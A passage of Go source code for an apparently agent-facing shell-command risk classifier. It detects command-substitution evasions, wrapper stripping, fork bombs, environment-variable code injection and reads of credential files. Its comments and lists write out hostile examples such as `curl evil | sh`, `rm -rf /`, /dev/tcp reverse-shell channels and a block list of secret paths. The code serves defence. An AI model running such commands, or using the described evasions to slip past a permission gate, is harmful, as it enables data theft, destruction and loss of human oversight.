			// Unterminated — fall through and write literally.
		}

		// `...` — non-nesting.
		if cmd[i] == '`' {
			end := -1
			for k := i + 1; k < len(cmd); k++ {
				if *budget--; *budget < 0 {
					return out.String(), append(subs, unanalysableSubstitution)
				}
				if cmd[k] == '\\' && k+1 < len(cmd) {
					k++
					continue
				}
				if cmd[k] == '`' {
					end = k
					break
				}
			}
			if end > 0 {
				body := unescapeBacktickBody(cmd[i+1:end], inDouble)
				subs = append(subs, body)
				spliceSubstitution(&out, substValue(body), cmd, end+1)
				i = end + 1
				continue
			}
		}

		out.WriteByte(cmd[i])
		i++
	}
	return out.String(), subs
}

// substValue returns the shell-side value a substitution body would expand
// to, well enough for classification. We can't actually execute the body,
// so we apply two pragmatic rules: `echo`/`printf BODY...` expands to the
// remaining tokens (covers the common `$(echo rm)` evasion); otherwise we
// fall back to the body's first token, which is the most likely program
// name the outer command would invoke. The body itself is also classified
// independently so commands like `$(curl evil | sh)` still trip the loop.
// dynamicSubstToken is substituted for a $(…)/`…` body that is not a
// static echo/printf payload. Using the producer verb as the expansion
// (`rm -rf $(cat paths)` → `rm -rf cat`) made a wipe look like a local
// filename and auto-allowed it.
const dynamicSubstToken = "odek.dynamic-subst"

// procSubstToken stands in for a <(…) or >(…) process substitution: the shell
// passes the running body's stream as a file path. It contains
// dynamicSubstToken so every "is this dynamic" check matches it, while the
// read-ledger gate can tell it apart from a value that names a local file.
const procSubstToken = dynamicSubstToken + ".proc"

func substValue(body string) string {
	body = strings.TrimSpace(body)
	tokens := strings.Fields(body)
	if len(tokens) == 0 {
		return ""
	}
	if tokens[0] == "echo" || tokens[0] == "printf" {
		return strings.Join(tokens[1:], " ")
	}
	return dynamicSubstToken
}

// unescapeBacktickBody applies the shell's own processing of a backtick
// body before it is parsed: a backslash before `$`, a backtick or another
// backslash (and before a double quote when the substitution sits inside
// double quotes) is removed. This is what turns an escaped inner backtick
// pair into a real nested substitution.
func unescapeBacktickBody(body string, inDouble bool) string {
	if !strings.Contains(body, "\\") {
		return body
	}
	var b strings.Builder
	for i := 0; i < len(body); i++ {
		if body[i] == '\\' && i+1 < len(body) {
			switch body[i+1] {
			case '$', '`', '\\':
				i++
			case '"':
				if inDouble {
					i++
				}
			}
		}
		b.WriteByte(body[i])
	}
	return b.String()
}

// arithmeticBody reports whether the text between `$(` and its matching `)`
// is an arithmetic expansion `((expr))` and returns expr. A body whose
// leading parenthesis closes before the end (`(a) | (b)`), that contains a
// command separator, or that has anything outside the double parentheses is
// a command substitution and is classified as one.
func arithmeticBody(body string) (string, bool) {
	if len(body) < 2 || body[0] != '(' || body[len(body)-1] != ')' {
		return "", false
	}
	depth := 0
	for i := 0; i < len(body); i++ {
		switch body[i] {
		case '(':
			depth++
		case ')':
			depth--
			if depth == 0 && i != len(body)-1 {
				return "", false
			}
		}
	}
	if depth != 0 {
		return "", false
	}
	inner := body[1 : len(body)-1]
	if strings.ContainsAny(inner, ";\n") {
		return "", false
	}
	return inner, true
}

// emptyPositionalLen returns the length of a positional-parameter expansion
// ($1…$9, ${N}, $@, $*, ${@}, ${*}) at the start of s, or 0.
func emptyPositionalLen(s string) int {
	if len(s) < 2 || s[0] != '$' {
		return 0
	}
	switch {
	case s[1] == '@' || s[1] == '*' || s[1] >= '1' && s[1] <= '9':
		return 2
	case s[1] == '{':
		end := strings.IndexByte(s, '}')
		if end < 3 {
			return 0
		}
		name := s[2:end]
		if name == "@" || name == "*" {
			return end + 1
		}
		if name[0] < '1' || name[0] > '9' {
			return 0
		}
		for k := 1; k < len(name); k++ {
			if name[k] < '0' || name[k] > '9' {
				return 0
			}
		}
		return end + 1
	}
	return 0
}

// wordGlue reports whether c is a byte of a shell word (as opposed to
// whitespace, an operator or a quote delimiter).
// spliceSubstitution writes the static value of a substitution into the
// rewritten command. A substitution glued to surrounding word characters
// joins them into one shell word (`git p$(echo ush)` runs `git push`), so the
// value is written without a separating space on any glued side; a value of
// several words still splits into separate words in between. A standalone
// substitution stays a word of its own.
func spliceSubstitution(out *strings.Builder, value, cmd string, next int) {
	if value == "" {
		return
	}
	gluedBefore := out.Len() > 0 && spliceGlue(out.String()[out.Len()-1])
	gluedAfter := next < len(cmd) && spliceGlue(cmd[next])
	if !gluedBefore {
		out.WriteByte(' ')
	}
	out.WriteString(value)
	if !gluedAfter {
		out.WriteByte(' ')
	}
}

// spliceGlue reports whether a byte next to a substitution keeps the
// substituted value in the same shell word. Unlike wordGlue, a quote
// character glues: `"$(echo rm)"` is the single word rm, and a quoted
// multi-word value stays one word, exactly as the shell treats it.
func spliceGlue(c byte) bool {
	return strings.IndexByte(" \t\n\r;|&<>()", c) < 0
}

func wordGlue(c byte) bool {
	return strings.IndexByte(" \t\n\r\"';|&<>()", c) < 0
}

// stripCommandWrappers removes leading shell builtins that simply invoke
// their first argument as a command (POSIX `command`, `exec`, `builtin`).
// Applied repeatedly so `exec command rm -rf /` is reduced to `rm -rf /`.
func stripCommandWrappers(cmd string) string {
	wrappers := map[string]struct{}{
		"command": {},
		"exec":    {},
		"builtin": {},
	}
	for {
		trimmed := strings.TrimLeft(cmd, " \t")
		// Find first whitespace-separated token.
		sp := strings.IndexAny(trimmed, " \t")
		if sp <= 0 {
			return trimmed
		}
		first := trimmed[:sp]
		if _, ok := wrappers[first]; !ok {
			return trimmed
		}
		cmd = trimmed[sp+1:]
		if first == "command" {
			// `command -v/-V NAME` only reports how NAME resolves; it runs
			// nothing, so it is not a wrapper around NAME. -p and -- are
			// options of the builtin, not the command being run.
			rest, lookup := skipCommandOptions(cmd)
			if lookup {
				return trimmed
			}
			cmd = rest
		}
	}
}

// skipCommandOptions skips the leading options of the `command` builtin
// (-p, --) in args and reports whether the invocation is a lookup (-v/-V).
func skipCommandOptions(args string) (string, bool) {
	for {
		trimmed := strings.TrimLeft(args, " \t")
		word := trimmed
		if sp := strings.IndexAny(trimmed, " \t"); sp >= 0 {
			word = trimmed[:sp]
		}
		switch {
		case word == "--":
			return strings.TrimLeft(trimmed[len(word):], " \t"), false
		case len(word) > 1 && word[0] == '-' && strings.Trim(word[1:], "pvV") == "":
			if strings.ContainsAny(word, "vV") {
				return trimmed, true
			}
			args = trimmed[len(word):]
		default:
			return trimmed, false
		}
	}
}

// collapseUnquotedBackslashes removes unquoted backslash escapes so
// `\rm` and `r\m` both reduce to `rm`. Inside single quotes backslash is
// literal; inside double quotes it only escapes a few specific chars.
// This mirrors the shell behaviour we need for classification — we are
// not trying to be a fully accurate shell parser.
func collapseUnquotedBackslashes(cmd string) string {
	var out strings.Builder
	inSingle := false
	inDouble := false
	for i := 0; i < len(cmd); i++ {
		ch := cmd[i]
		switch {
		case ch == '\'' && !inDouble:
			inSingle = !inSingle
			out.WriteByte(ch)
		case ch == '"' && !inSingle:
			inDouble = !inDouble
			out.WriteByte(ch)
		case ch == '\\' && !inSingle && i+1 < len(cmd):
			next := cmd[i+1]
			if inDouble {
				// Inside double quotes a backslash escapes only \ " $ `.
				// Those pairs stay intact for tokenize, so an escaped quote
				// or backslash cannot change the quote state seen later; any
				// other backslash is dropped.
				switch next {
				case '\\', '"', '$', '`':
					out.WriteByte(ch)
				}
				out.WriteByte(next)
			} else {
				// Unquoted: drop the backslash, except in front of a quote
				// character or another backslash. Those stay as an escaped
				// pair that tokenize turns into the literal character; a
				// bare quote would open a span and hide the rest.
				if next == '\'' || next == '"' || next == '\\' {
					out.WriteByte(ch)
				}
				out.WriteByte(next)
			}
			i++
		default:
			out.WriteByte(ch)
		}
	}
	return out.String()
}

func isKnownCommandName(name string) bool {
	if name == "rm" || name == "sudo" {
		return true
	}
	return writePrefixes[name] ||
		systemPrefixes[name] ||
		destructivePrefixes[name] ||
		networkPrefixes[name] ||
		codeEvalPrefixes[name] ||
		embeddedShellInterpreters[name] ||
		installPrefixes[name] ||
		pipedShells[name] ||
		safeCommands[name] ||
		remoteRunPrefixes[name] ||
		execWrappers[name] ||
		privilegedWrappers[name] ||
		isStdinExecInterpreter(name) ||
		argvComposers[name] ||
		projectExecCommands[name] ||
		displayVerbs[name]
}

// rawForkBombRe matches the fork-bomb SHAPE: a `:` command at word-start
// that defines a function (`()`) or a brace group that already contains a
// recursive spawn (`|` / `&`). The `()` group used to be optional, so
// innocent arguments like `echo :{a}:` were Blocked even in YOLO mode.
// Canonical `:(){ :|:& };:` and spaced `: () { : | : & } ; :` still match.
var rawForkBombRe = regexp.MustCompile(`(^|[;&|\s]):\s*(?:\(\s*\)\s*)?\{[^}]*[|&][^}]*\}\s*;?\s*:`)

// namedForkBombShapeRe matches the outer shape of a function-definition
// fork bomb: `name(){ body-with-pipe-or-amp };name` (or with spaces /
// extra separators). The definition must start at a real command position
// — start of input or right after `;`, `&`, `|`, or a newline — not in
// argument position after another command's name (e.g. `echo bomb(){…}`).
// Backreferences are unsupported in RE2, so the name-equality and
// recursive-spawn checks are done in code over the captured groups.
var namedForkBombShapeRe = regexp.MustCompile(`(?s)(?:^|[;&|\n])(\w+)\s*(?:\(\s*\)\s*)?\{([^}]*)\}\s*;?\s*(\w+)(?:\s|$)`)

// isNamedForkBomb reports whether a shape match is a genuine
// self-recursing fork bomb: the function defined, the function invoked
// after the body, and at least two self-references inside the body (a
// real bomb spawns itself more than once; a body calling it once with
// other work is not self-sustaining).
func isNamedForkBomb(m []string) bool {
	defName, body, tailName := m[1], m[2], m[3]
	if defName != tailName {
		return false
	}
	// A fork bomb spawns itself concurrently: the body must contain a
	// pipe or ampersand at all. Without one the worst case is a plain
	// recursive function (a benign pattern), never unbounded spawning.
	if !strings.ContainsAny(body, "|&") {
		return false
	}
	return strings.Count(body, defName) >= 2
}

// isRawBlocked checks the raw command string for patterns that are
// blocked regardless of tokenization artifacts.
func isRawBlocked(cmd string) bool {
	// Fork bomb (canonical form)
	if cmd == ":(){ :|:& };:" {
		return true
	}
	if rawForkBombRe.MatchString(cmd) {
		return true
	}
	for _, m := range namedForkBombShapeRe.FindAllStringSubmatch(cmd, -1) {
		if isNamedForkBomb(m) {
			return true
		}
	}
	return false
}

// splitSegments splits token sequences on command separators.
// ;, &&, ||, and a lone & all start a new segment — `cat a & curl …`
// runs curl regardless of how benign the first verb looks. Pipe (| and
// the both-streams |&) is NOT a segment separator — it stays within a
// segment so code_execution detection can find it.
func splitSegments(tokens []string) [][]string {
	var segments [][]string
	var current []string

	for _, tok := range tokens {
		switch tok {
		case ";", "&&", "||", "&", ";;", ";&", ";;&":
			if len(current) > 0 {
				segments = append(segments, current)
				current = nil
			}
		default:
			current = append(current, tok)
		}
	}
	if len(current) > 0 {
		segments = append(segments, current)
	}
	for i := range segments {
		segments[i] = unmarkLiteralOperators(segments[i])
	}
	return segments
}

// operatorLookalikes are the separator and pipe spellings that a quoted word
// can also have (`grep ';' x`, `cut -d $'\n'`).
var operatorLookalikes = map[string]bool{
	";": true, "&&": true, "||": true, "&": true, ";;": true, ";&": true, ";;&": true,
	"|": true, "|&": true,
}

// markLiteralOperators prefixes every token that is spelled like a separator
// or pipe but was written as a word (ops reports operators written outside
// quotes), so the splitters below read it as an argument. The splitters strip
// the mark again from the stages they return. A nil ops means every token is
// an operator.
func markLiteralOperators(tokens []string, ops []bool) []string {
	if ops == nil {
		return tokens
	}
	var out []string
	for i, tok := range tokens {
		if !ops[i] && operatorLookalikes[tok] {
			if out == nil {
				out = append([]string(nil), tokens...)
			}
			out[i] = literalMark + tok
		}
	}
	if out == nil {
		return tokens
	}
	return out
}

// markWordOperators marks every operator-shaped token in words, which are
// already known to be plain command words.
func markWordOperators(words []string) []string {
	flags := make([]bool, len(words))
	return markLiteralOperators(words, flags)
}

// unmarkLiteralOperators removes the literal mark from a token sequence,
// copying only when a mark is present.
func unmarkLiteralOperators(tokens []string) []string {
	var out []string
	for i, tok := range tokens {
		if strings.HasPrefix(tok, literalMark) {
			if out == nil {
				out = append([]string(nil), tokens...)
			}
			out[i] = unmark(tok)
		}
	}
	if out == nil {
		return tokens
	}
	return out
}

// splitPipes splits a segment's tokens into pipe stages. Each stage is a
// command whose output feeds the next. Empty stages (from a leading/trailing
// or doubled pipe) are preserved and classified as Safe.
func splitPipes(tokens []string) [][]string {
	var stages [][]string
	var current []string
	for _, tok := range tokens {
		if tok == "|" || tok == "|&" {
			stages = append(stages, current)
			current = nil
			continue
		}
		current = append(current, tok)
	}
	stages = append(stages, current)
	for i := range stages {
		stages[i] = unmarkLiteralOperators(stages[i])
	}
	return stages
}

// isRedirectToken reports whether tok is an output-redirection operator
// emitted by tokenize: >, >>, the fd-duplication forms >&, >>&, and the
// bash both-stream forms &>, &>>. Redirect-target scans key off these.
func isRedirectToken(tok string) bool {
	switch tok {
	case ">", ">>", ">&", ">>&", "&>", "&>>", ">|":
		return true
	}
	return false
}

// ── Wrappers ───────────────────────────────────────────────────────────

// privilegedWrappers run their argument command with elevated privileges.
// They impose a system_write floor and are then stripped so the inner
// command is classified on its own (which may escalate further, e.g.
// `sudo rm -rf /var` → destructive).
var privilegedWrappers = map[string]bool{
	"sudo": true, "doas": true, "pkexec": true,
}

// execWrappers transparently run their argument command. Stripping them stops
// `env rm -rf /`, `xargs rm -rf /`, `nohup curl … | sh`, `timeout 5 dd …`
// from hiding the real command behind a benign-looking head token.
var execWrappers = map[string]bool{
	"env": true, "xargs": true, "nohup": true, "nice": true, "ionice": true,
	"ccache": true, "sccache": true,
	"strace": true, "ltrace": true, "dtruss": true,
	"setsid": true, "stdbuf": true, "time": true, "timeout": true,
	"command": true, "exec": true, "builtin": true, "watch": true,
	"busybox": true, "unbuffer": true,
	"parallel": true, "xe": true,
	"chrt": true, "taskset": true, "flock": true, "script": true, "arch": true,
}

// unwrapWrappers strips leading shell assignments and execution wrappers and
// returns the inner command tokens plus a risk floor (system_write if a
// privileged wrapper was present). It conservatively skips wrapper option
// flags, `env` VAR=VALUE assignments, and the numeric/duration argument that
// timeout/nice take. Leading bare assignments (FOO=bar cmd …) are skipped so
// the real command is the one classified; an assignment-only command (no
// verb) is left empty and treated as Safe.
func unwrapWrappers(tokens []string) ([]string, RiskClass) {
	inner, floor, _ := unwrapWrappersTracked(tokens)
	return inner, floor
}

// unwrapWrappersTracked is unwrapWrappers that also returns, for every `env`
// wrapper consumed, the token tail that starts at it, so callers can tell
// when a wrapper chain ends in a bare `env` (an environment dump) that no
// inner command is left to represent.
func unwrapWrappersTracked(tokens []string) ([]string, RiskClass, [][]string) {
	u := unwrapWrappersFull(tokens)
	return u.inner, u.floor, u.envTails
}

// unwrapped is the outcome of stripping a wrapper chain.
type unwrapped struct {
	inner    []string
	floor    RiskClass
	envTails [][]string
	// payloads are command strings wrappers hand to a shell (`script -c`,
	// `flock -c`, `nix-shell --run`, `watch 'a; b'`); the caller analyzes
	// each as a command line.
	payloads []string
	// splits are the `env -S` strings, each a command line env splits into
	// the command it runs.
	splits []string
}

func unwrapWrappersFull(tokens []string) unwrapped {
	out := unwrapped{floor: Safe}
	var splitValues []string
	var assignments []string
	i := 0
	for i < len(tokens) && isAssignment(tokens[i]) {
		assignments = append(assignments, tokens[i])
		i++ // leading VAR=value assignment prefix
	}
	tokens = tokens[i:]
	i = 0
	for i < len(tokens) {
		step, ok := wrapperAt(tokens, i)
		if !ok {
			break
		}
		out.floor = worstOf(out.floor, step.floor)
		if step.name == "env" {
			out.envTails = append(out.envTails, tokens[i:])
		}
		splitValues = append(splitValues, step.splits...)
		assignments = append(assignments, step.assigns...)
		if step.payload != "" {
			out.payloads = append(out.payloads, step.payload)
		}
		i = step.next
	}
	out.inner = tokens[i:]
	out.splits = splitValues
	if len(assignments) > 0 {
		// Evaluate after wrappers are stripped so ENV=/tmp/x env sh
		// sees inner `sh`, not the `env` wrapper. Names like GIT_PAGER
		// and LD_PRELOAD do not depend on the inner verb.
		out.floor = worstOf(out.floor, envAssignmentRisk(assignments, out.inner))
	}
	if len(splitValues) > 0 {
		// `env -S STRING` splits STRING into the command (and arguments)
		// that env runs, ahead of any remaining operands, so the split
		// string is a real command line and is classified as one.
		var composed []string
		for _, v := range splitValues {
			composed = append(composed, tokenize(v)...)
		}
		composed = append(composed, out.inner...)
		out.floor = worstOf(out.floor, classifyStage(composed, false))
	}
	return out
}

// commandIsLookup reports whether the arguments of the `command` builtin
// make it a lookup (-v/-V, possibly after -p) rather than an execution.
func commandIsLookup(args []string) bool {
	for _, a := range args {
		if a == "--" || len(a) < 2 || a[0] != '-' || strings.Trim(a[1:], "pvV") != "" {
			return false
		}
		if strings.ContainsAny(a, "vV") {
			return true
		}
	}
	return false
}

func hasDynamicSubst(tokens []string) bool {
	for _, t := range tokens {
		if t == dynamicSubstToken || t == procSubstToken {
			return true
		}
	}
	return false
}

// envExecNames are assignment names that turn the wrapped command into
// arbitrary code execution by themselves: dynamic loaders (LD_PRELOAD and
// friends inject a shared object into the next process), values that a
// wrapped tool executes as a shell command (git/man pagers, editors, ssh),
// git helper search paths and alternate config files, shell startup files
// sourced by non-interactive invocations, and runtime require/preload
// hooks. Anything ending in PAGER is included (AWS_PAGER, SYSTEMD_PAGER,
// …) since they all exec their value. Bare ENV is deliberately excluded:
// it is a common application flag name (ENV=production) and only matters
// when the inner command is a POSIX shell (see posixShells).
var envExecNames = map[string]bool{
	"PATH": true, "LD_PRELOAD": true, "LD_LIBRARY_PATH": true, "LD_AUDIT": true,
	"DYLD_INSERT_LIBRARIES": true, "DYLD_LIBRARY_PATH": true,
	"BASH_ENV": true, "ZDOTDIR": true,
	"NODE_OPTIONS": true, "PERL5OPT": true, "RUBYOPT": true,
	"GIT_SSH_COMMAND": true, "GIT_SSH": true, "GIT_EDITOR": true, "GIT_SEQUENCE_EDITOR": true,
	"GIT_EXTERNAL_DIFF": true, "GIT_DIFFTOOL": true,
	"GIT_ASKPASS": true, "GIT_PROXY_COMMAND": true,
	"GIT_EXEC_PATH":     true,
	"GIT_CONFIG_GLOBAL": true, "GIT_CONFIG_SYSTEM": true, "GIT_CONFIG_PARAMETERS": true,
	// GIT_CONFIG_COUNT with GIT_CONFIG_KEY_<n>/GIT_CONFIG_VALUE_<n> injects
	// config exactly like `git -c` (see envAssignmentRisk for the indexed names).
	"GIT_CONFIG_COUNT": true,
	// JVM option files/agents, less preprocessors, ssh askpass helpers and
	// glibc gconv module paths all load or exec attacker-chosen code from
	// otherwise read-only commands (`java -version`, `less f`, `iconv`).
	"JAVA_TOOL_OPTIONS": true, "_JAVA_OPTIONS": true, "JDK_JAVA_OPTIONS": true,
	"LESSOPEN": true, "LESSCLOSE": true,
	"SSH_ASKPASS": true, "SSH_ASKPASS_REQUIRE": true,
	"GCONV_PATH": true,
	// Path hijacks: retarget metadata/worktree/index so a planted repo
	// or corrupt index is what a later "safe" git verb actually sees.
	"GIT_DIR": true, "GIT_WORK_TREE": true, "GIT_INDEX_FILE": true,
	"GIT_OBJECT_DIRECTORY": true, "GIT_ALTERNATE_OBJECT_DIRECTORIES": true,
	"GIT_COMMON_DIR": true, "GIT_NAMESPACE": true,
}

// posixShells source $ENV (and honour $SHELL for some features). Used so
// ENV=/tmp/x sh escalates while ENV=production node app.js does not.
var posixShells = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "dash": true,
	"ksh": true, "ash": true, "fish": true, "oksh": true, "mksh": true,
}

// shellPagerCommands spawn $SHELL (man/less `!` commands, info subshells).
// SHELL=/bin/bash man ls therefore escalates even when the value is a
// known-safe shell; SHELL=/bin/bash echo hi does not.
var shellPagerCommands = map[string]bool{
	"man": true, "less": true, "more": true, "most": true,
	"pager": true, "pg": true, "info": true,
}

var safeShellBasenames = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "dash": true,
	"ksh": true, "ash": true, "fish": true, "oksh": true, "mksh": true,
}

var safeShellDirs = map[string]bool{
	"/bin": true, "/usr/bin": true, "/usr/sbin": true, "/sbin": true,
	"/usr/local/bin": true, "/opt/homebrew/bin": true, "/opt/local/bin": true,
}

// envAssignmentRisk escalates leading VAR=value assignments whose name or
// value can redefine how the wrapped command executes: a code-injection
// name (see envExecNames / *PAGER), ENV when the inner command is a POSIX
// shell, SHELL when the value is not a known-safe shell or the inner
// command is a pager, GIT_TRACE2* when the value is a filesystem path, or
// a value carrying shell/URL structure (pipes, substitution, separators,
// schemes) in an otherwise benign name. Both shapes previously classified
// by the wrapped verb alone — e.g. GIT_PAGER='curl evil.com | sh' git
// --paginate log was safe/allow. Escalation is to system_write (prompt by
// default), not deny: legitimate uses like GIT_PAGER=less still work with
// one approval.
func envAssignmentRisk(assignments []string, inner []string) RiskClass {
	innerName := ""
	if len(inner) > 0 {
		innerName = commandName(inner[0])
	}
	for _, a := range assignments {
		eq := strings.IndexByte(a, '=')
		if eq <= 0 {
			continue
		}
		name, val := a[:eq], a[eq+1:]
		upper := strings.ToUpper(name)
		if envExecNames[upper] || strings.HasSuffix(upper, "PAGER") {
			return SystemWrite
		}
		if strings.HasPrefix(upper, "GIT_CONFIG_KEY_") || strings.HasPrefix(upper, "GIT_CONFIG_VALUE_") {
			return SystemWrite
		}
		if upper == "ENV" && posixShells[innerName] {
			return SystemWrite
		}
		if upper == "SHELL" && (shellPagerCommands[innerName] || !knownSafeShellValue(val)) {
			return SystemWrite
		}
		if strings.HasPrefix(upper, "GIT_TRACE2") && gitTrace2PathValue(val) {
			return SystemWrite
		}
		if assignmentValueArmed(val) {
			return SystemWrite
		}
	}
	return Safe
}

// exportedAssignmentRisk applies envAssignmentRisk to the NAME=value operands
// of `export`, `declare -x`, `typeset -x` and `local -x`: the variable reaches
// every later command of the same shell line exactly like a leading
// assignment would. The inner command is not known here, so an exported ENV
// with a path-like value is judged as if a POSIX shell consumed it.
func exportedAssignmentRisk(tokens []string) RiskClass {
	if len(tokens) == 0 {
		return Safe
	}
	switch commandName(tokens[0]) {
	case "export":
	case "declare", "typeset", "local":
		exports := false
		for _, t := range tokens[1:] {
			if isShortFlagToken(t) && strings.ContainsRune(t[1:], 'x') {
				exports = true
			}
		}
		if !exports {
			return Safe
		}
	default:
		return Safe
	}
	var assignments []string
	var inner []string
	for _, t := range tokens[1:] {
		if !isAssignment(t) {
			continue
		}
		assignments = append(assignments, t)
		if name, val, _ := strings.Cut(t, "="); strings.EqualFold(name, "ENV") && strings.ContainsAny(val, "/~.") {
			inner = []string{"sh"}
		}
	}
	return envAssignmentRisk(assignments, inner)
}

// knownSafeShellValue reports whether val names a system shell rather than
// an attacker-controlled binary. Bare basenames (bash, sh) are PATH lookups
// and treated as safe; relative paths (./bash, /tmp/bash) are not.
func knownSafeShellValue(val string) bool {
	v := strings.Trim(strings.TrimSpace(val), `"'`)
	if v == "" {
		return true
	}
	base := strings.ToLower(filepath.Base(v))
	if !safeShellBasenames[base] {
		return false
	}
	if !strings.Contains(v, "/") {
		return true
	}
	if strings.Contains(v, "..") || strings.HasPrefix(v, ".") {
		return false
	}
	dir := filepath.ToSlash(filepath.Clean(filepath.Dir(v)))
	return safeShellDirs[dir]
}

// gitTrace2PathValue reports whether a GIT_TRACE2* value names a file (or
// relative path) rather than the boolean/fd forms (`1`, `true`, `2`) that
// write to stderr. A path destination is an arbitrary-file write.
func gitTrace2PathValue(val string) bool {
	v := strings.Trim(strings.TrimSpace(val), `"'`)
	if v == "" {
		return false
	}
	return strings.Contains(v, "/") || strings.HasPrefix(v, ".")
}

// assignmentValueArmed reports whether an assignment value carries shell or
// URL structure that could turn it into execution when a tool passes it to
// a shell (pagers, editors, ssh commands).
func assignmentValueArmed(val string) bool {
	v := strings.TrimSpace(val)
	if v == "" {
		return false
	}
	for _, frag := range []string{"|", ";", "`", "$(", "&", "://"} {
		if strings.Contains(v, frag) {
			return true
		}
	}
	return false
}

// classifyResourceToken flags dangerous resources that may appear as any
// argument or redirect target, independent of the command verb: bash
// pseudo-device network channels (/dev/tcp, /dev/udp — reverse shells) and
// reads/writes of sensitive credential paths.
func classifyResourceToken(tok string) RiskClass {
	lt := strings.ToLower(tok)
	if strings.Contains(lt, "/dev/tcp/") || strings.Contains(lt, "/dev/udp/") {
		// A shell-opened raw socket carries data in both directions, so it
		// is an upload channel, not a plain fetch.
		return NetworkUpload
	}
	if isSensitivePath(tok) {
		return SystemWrite
	}
	if isSensitiveOdekPath(tok) {
		return SystemWrite
	}
	path := expandShellTokenPath(tok)
	if _, err := os.Stat(path); err == nil {
		if resolved, err := resolvePathTarget(path); err == nil {
			if isSensitivePath(resolved) || isSensitiveOdekPath(resolved) {
				return SystemWrite
			}
		}
	}
	return Safe
}

// sensitivePathFragments are substrings that mark a path as carrying secrets.
// Matching is substring-based so it catches ~, /root, /home/<user>, and
// absolute variants alike. /etc/passwd is intentionally excluded — it is
// world-readable and accessed routinely, so flagging it is pure noise.
//
// This is deliberately distinct from ClassifyPath's home-sensitive-dir list:
// that classifies the *write* risk of an absolute filesystem path (for the
// file tool), whereas this flags *credential reads/writes* in a raw shell
// token (which may be ~-relative or carry an `of=`-style prefix). They
// overlap (~/.ssh, ~/.aws, ~/.gnupg) but are not interchangeable; if you add
// a credential location to one, consider whether the other needs it too.
var sensitivePathFragments = []string{
	"/etc/shadow", "/etc/gshadow", "/etc/sudoers", "/etc/ssl/private",
	"/.ssh", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
	"/.aws/credentials", "/.aws/config", "/.config/gcloud",
	"/.kube/config", "/.docker/config.json", "/.netrc", "/.pgpass",
	"/.git-credentials", "/.gnupg", "/.npmrc", "/.pypirc",
	"/.my.cnf", "/.mylogin.cnf",
	"/.cargo/credentials", "/.gem/credentials", "/.azure/credentials",
	"/.password-store", "/.terraform.d", "/.vault-token",
	"/proc/self/environ", "/environ",
}

func isSensitivePath(tok string) bool {
	t := strings.ToLower(tok)
	for _, prefix := range []string{"of=", "if="} {
		if strings.HasPrefix(t, prefix) {
			t = t[len(prefix):]
			break
		}
	}
	for _, frag := range sensitivePathFragments {
		if sensitiveFragmentMatch(t, frag) {
			return true
		}
	}
	return false
}

// sensitiveFragmentMatch requires path-shaped context so bare words and
// prose do not trip credential fragments: `echo id_rsa` and
// `echo "see ~/.ssh docs"` are Safe, while `cat ~/.ssh/id_rsa` and
// `cat /etc/shadow` still match.
func sensitiveFragmentMatch(tok, frag string) bool {
	if frag == "/environ" {
		// `/environ` as a raw substring matches "set /environ var".
		// Only /proc/…/environ is a credential file.
		return strings.Contains(tok, "/proc/") && strings.Contains(tok, "/environ")
	}
	if !strings.Contains(tok, frag) {
		return false
	}
	if strings.HasPrefix(frag, "/") {
		return pathBoundedContains(tok, frag)
	}
	// Basename fragments (id_rsa, …): must be a path component, not a
	// substring of an unrelated word (`my_id_rsa_backup`) and not a
	// bare search pattern (`grep id_rsa README`).
	return pathComponentEquals(tok, frag)
}

func pathBoundedContains(tok, frag string) bool {
	for idx := 0; idx <= len(tok); {
		i := strings.Index(tok[idx:], frag)
		if i < 0 {
			return false
		}
		i += idx
		after := i + len(frag)
		afterOK := after == len(tok) || tok[after] == '/' || tok[after] == '.'
		if afterOK {
			return true
		}
		idx = i + 1
	}
	return false
}

func pathComponentEquals(tok, frag string) bool {
	// Require a path separator or ~ somewhere so `grep id_rsa README`
	// (bare word) is not a credential path, while `~/.ssh/id_rsa` and
	// `/home/x/.ssh/id_rsa` still match.
	if !strings.ContainsAny(tok, "/~") {
		return false
	}
	base := tok
	if i := strings.LastIndexByte(tok, '/'); i >= 0 {
		base = tok[i+1:]
	}
	if base == frag || strings.HasPrefix(base, frag+".") {
		return true
	}
	// Also match the fragment as a complete component in the middle
	// (`…/id_rsa/…` is unusual but fail-closed).
	return strings.Contains(tok, "/"+frag+"/") || strings.HasSuffix(tok, "/"+frag)
}

// isSensitiveOdekPath reports whether tok names a ~/.odek trust anchor that
// must not be read through auto-approved Safe commands. Reading config.json,
// secrets.env, IDENTITY.md, sessions, audit logs, etc. leaks secrets or trusted
// instructions, so it escalates to SystemWrite. This mirrors the write-side
// protection in ClassifyPath and cmd/odek/file_tool.go::isProtectedOdekPath.
func isSensitiveOdekPath(tok string) bool {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		return false
	}
	path := expandTilde(tok)
	abs, err := absPath(path)
	if err != nil {
		return false
	}
	abs = filepath.Clean(abs)
	if isOdekTrustAnchor(home, abs) {
		return true
	}
	resolvedHome, err := resolvePathTarget(home)
	if err != nil {
		return false
	}
	resolvedPath, err := resolvePathTarget(abs)
	return err == nil && isOdekTrustAnchor(resolvedHome, resolvedPath)
}

// classifyShellTokenPath expands ~ and common environment-variable shorthands
// in a shell token, strips prefixes like "of=", and returns the ClassifyPath
// result for the filesystem path it names. It lets shell commands be checked
// against the same home-sensitive-dir and rc-file lists used by the file tools,
// closing the gap where `echo x >> ~/.bashrc` was auto-allowed as local_write.
func classifyShellTokenPath(tok string) RiskClass {
	return ClassifyPath(expandShellTokenPath(tok))
}

// expandShellTokenPath strips common key=value prefixes (dd-style) and
// expands ~ / $HOME shorthands in a shell token into an absolute-ready
// path. Relative paths are returned as-is; IsPersistencePath/ClassifyPath
// resolve them against the working directory.
func expandShellTokenPath(tok string) string {
	path := tok

	// Strip common key=value prefixes used by dd and similar tools.
	for _, prefix := range []string{"of=", "if="} {
		if strings.HasPrefix(strings.ToLower(path), prefix) {
			path = path[len(prefix):]
			break
		}
	}
	// Fused fd redirects: `2>/dev/null` is a single token.
	if i := strings.IndexByte(path, '>'); i >= 0 {
		fd := path[:i]
		if fd == "" || isAllDigits(fd) {
			path = strings.TrimPrefix(path[i+1:], ">")
		}
	}
	if path == "" {
		return path
	}

	// Expand the leading tilde the way a shell does.
	path = expandTilde(path)
	// Expand $VAR / ${VAR} from the process environment — the classifier
	// runs in the same environment the shell would resolve these from, and
	// `bash $PWD/evil.sh` must gate exactly like `bash ./evil.sh`
	// (readledger $VAR-expanded paths are in scope). Unset variables
